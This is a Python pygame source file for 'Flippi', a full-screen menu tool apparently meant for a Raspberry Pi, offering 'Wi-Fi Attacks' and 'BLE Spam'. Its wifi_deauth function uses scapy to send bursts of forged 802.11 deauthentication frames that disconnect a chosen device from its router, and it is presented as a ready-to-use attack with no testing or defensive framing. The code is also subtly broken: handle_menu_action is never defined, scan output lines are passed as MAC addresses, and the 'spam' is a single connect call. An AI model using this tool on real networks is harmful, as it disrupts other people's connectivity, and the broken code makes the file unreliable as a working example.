import pygame
import subprocess
import time
import os
import re
from scapy.all import *

# Initialize Pygame
pygame.init()

# Screen dimensions
info = pygame.display.Info()
WIDTH, HEIGHT = info.current_w, info.current_h
screen = pygame.display.set_mode((WIDTH, HEIGHT), pygame.FULLSCREEN)
pygame.display.set_caption("Flippi")

# Colors and themes
themes = {
    "Flipper Theme": {"background": (255, 140, 0), "text": (0, 0, 0), "highlight": (255, 255, 255)},
    "Raspberry Pi Theme": {"background": (255, 255, 255), "text": (0, 0, 0), "highlight": (128, 0, 128)},
    "Custom Theme": {"background": (0, 0, 0), "text": (255, 255, 255), "highlight": (255, 165, 0)},
}
current_theme = "Flipper Theme"
brightness = 1.0

# Fonts
FONT = pygame.font.Font(None, 36)
LARGE_FONT = pygame.font.Font(None, 48)

# Layout settings
menu_items = ["Wi-Fi Attacks", "BLE Spam", "Settings", "Exit"]
soft_buttons = ["Select", "Back"]
menu_index = 0

# Helper functions
def apply_brightness(color):
    """Apply brightness adjustment to a color."""
    return tuple(min(255, max(0, int(c * brightness))) for c in color)

def get_network_interface():
    """Auto-detect the network interface for Wi-Fi."""
    try:
        interfaces = subprocess.check_output(["iwconfig"]).decode("utf-8")
        for line in interfaces.splitlines():
            if "IEEE 802.11" in line:  # Line containing the wireless interface
                interface = line.split()[0]  # Extract the interface name
                return interface
    except Exception as e:
        print(f"Error detecting network interface: {e}")
    return "wlan0"  # Default interface

def get_router_mac(interface="wlan0"):
    """Auto-detect the router's MAC address (Access Point)."""
    try:
        # Using `iwlist` to scan for networks and extract the router's MAC address
        networks = subprocess.check_output(["sudo", "iwlist", interface, "scan"]).decode("utf-8")
        for line in networks.splitlines():
            if "Cell" in line:
                # Extract MAC address (format XX:XX:XX:XX:XX:XX)
                mac_match = re.search(r"Address: ([\w:]{17})", line)
                if mac_match:
                    return mac_match.group(1)
    except Exception as e:
        print(f"Error detecting router MAC: {e}")
    return "00:00:00:00:00:00"  # Default MAC address

def wifi_scan(interface="wlan0"):
    """Scan for available Wi-Fi networks."""
    print("Scanning for Wi-Fi networks...")
    try:
        networks = subprocess.check_output(["sudo", "iwlist", interface, "scan"])
        networks = networks.decode("utf-8")
        return networks.splitlines()
    except Exception as e:
        print(f"Error during Wi-Fi scan: {e}")
        return []

def bluetooth_scan():
    """Scan for nearby Bluetooth devices."""
    print("Scanning for Bluetooth devices...")
    try:
        devices = subprocess.check_output(["sudo", "bluetoothctl", "scan", "on"])
        devices = devices.decode("utf-8")
        return devices.splitlines()
    except Exception as e:
        print(f"Error during Bluetooth scan: {e}")
        return []

def wifi_deauth(target_mac, router_mac, interface="wlan0"):
    """Perform a Wi-Fi deauthentication attack."""
    print(f"Starting Wi-Fi deauth attack on {target_mac}...")
    try:
        packet = RadioTap()/Dot11(addr1=target_mac, addr2=router_mac, addr3=router_mac)/Dot11Deauth()
        sendp(packet, iface=interface, count=100, verbose=1)
    except Exception as e:
        print(f"Error during deauth: {e}")

def ble_spam(target_mac):
    """Spam a specific Bluetooth device with data."""
    print(f"Spamming Bluetooth device {target_mac}...")
    try:
        subprocess.run(["sudo", "bluetoothctl", "connect", target_mac])
    except Exception as e:
        print(f"Error during BLE spam: {e}")

# Settings menu and other functions are unchanged

def wifi_deauth_menu():
    """Wi-Fi deauth selection menu."""
    interface = get_network_interface()  # Auto-detect interface
    router_mac = get_router_mac(interface)  # Auto-detect router MAC
    print(f"Detected router MAC: {router_mac} on interface {interface}")

    mac_addresses = wifi_scan(interface)
    mac_index = 0

    running = True
    while running:
        screen.fill(apply_brightness(themes[current_theme]["background"]))
        title = LARGE_FONT.render("Select Target MAC", True, apply_brightness(themes[current_theme]["highlight"]))
        screen.blit(title, (WIDTH // 2 - title.get_width() // 2, 20))

        for i, mac in enumerate(mac_addresses[:10]):  # Show first 10 MAC addresses
            color = apply_brightness(themes[current_theme]["highlight"] if i == mac_index else themes[current_theme]["text"])
            text = FONT.render(mac, True, color)
            screen.blit(text, (50, 100 + i * 50))

        pygame.display.flip()

        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                pygame.quit()
                exit()
            elif event.type == pygame.KEYDOWN:
                if event.key == pygame.K_UP:
                    mac_index = (mac_index - 1) % len(mac_addresses)
                elif event.key == pygame.K_DOWN:
                    mac_index = (mac_index + 1) % len(mac_addresses)
                elif event.key == pygame.K_RETURN:
                    target_mac = mac_addresses[mac_index]
                    wifi_deauth(target_mac, router_mac, interface)
                    running = False
                elif event.key == pygame.K_ESCAPE:
                    running = False

def run_main_menu():
    """Main menu to navigate between different actions."""
    global menu_index

    running = True
    while running:
        screen.fill(apply_brightness(themes[current_theme]["background"]))
        title = LARGE_FONT.render("Flippi - Main Menu", True, apply_brightness(themes[current_theme]["highlight"]))
        screen.blit(title, (WIDTH // 2 - title.get_width() // 2, 20))

        for i, item in enumerate(menu_items):
            color = apply_brightness(themes[current_theme]["highlight"] if i == menu_index else themes[current_theme]["text"])
            text = FONT.render(item, True, color)
            screen.blit(text, (50, 100 + i * 50))

        pygame.display.flip()

        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                pygame.quit()
                exit()
            elif event.type == pygame.KEYDOWN:
                if event.key == pygame.K_UP:
                    menu_index = (menu_index - 1) % len(menu_items)
                elif event.key == pygame.K_DOWN:
                    menu_index = (menu_index + 1) % len(menu_items)
                elif event.key == pygame.K_RETURN:
                    handle_menu_action()
                elif event.key == pygame.K_ESCAPE:
                    running = False

if __name__ == "__main__":
    run_main_menu()